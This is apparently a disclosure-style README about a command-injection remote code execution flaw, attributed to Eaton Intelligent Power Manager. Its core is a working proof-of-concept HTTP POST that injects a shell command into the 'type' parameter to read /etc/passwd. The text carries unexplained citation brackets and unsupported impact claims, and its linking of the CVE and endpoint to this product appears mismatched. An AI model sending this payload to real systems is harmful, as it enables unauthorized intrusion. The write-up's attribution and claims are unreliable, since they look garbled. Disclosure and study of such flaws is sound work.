# 🛡 Remote Code Execution (RCE) in Eaton Intelligent Power Manager

> [!IMPORTANT]
> Vulnerability Discovery: During a security assessment, I identified a Critical Unauthenticated Remote Code Execution (RCE) vulnerability in the Eaton Intelligent Power Manager (IPM). 
> 
> By manipulating the type parameter in a POST request, I successfully executed arbitrary system commands with root privileges. [1, 1.1]

---

## 🔍 Vulnerability Type
*   Vulnerability Name: Remote Code Execution (RCE) [1.1]
*   CVE ID: CVE-2014-1203 [1.3]
*   Attack Vector: Unauthenticated Command Injection [1.2]

## 💥 Impact
The exploitation of this vulnerability leads to a Full Infrastructure Takeover:

*   Root Privilege Execution: Complete control over the underlying operating system. [1.1, 1.3]
*   Critical Asset Risk: As Eaton IPM manages UPS systems, an attacker can remotely power off data centers, causing massive physical and digital disruption. [1.3]
*   Credential Leakage: Access to sensitive files (e.g., /etc/passwd) and hijacked sessions for integrated services like Jenkins, Grafana, and WordPress. [1.1, 2.1]

## 🛠 Proof of Concept (PoC)

To reproduce the vulnerability, send the following POST request to the target: [1.2]

```http
POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
Host: <TARGET_IP>:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

type='|cat /etc/passwd||'
```
<img width="1321" height="378" alt="image" src="https://github.com/user-attachments/assets/78262a0d-904b-44dc-a890-cd593836c18e" />



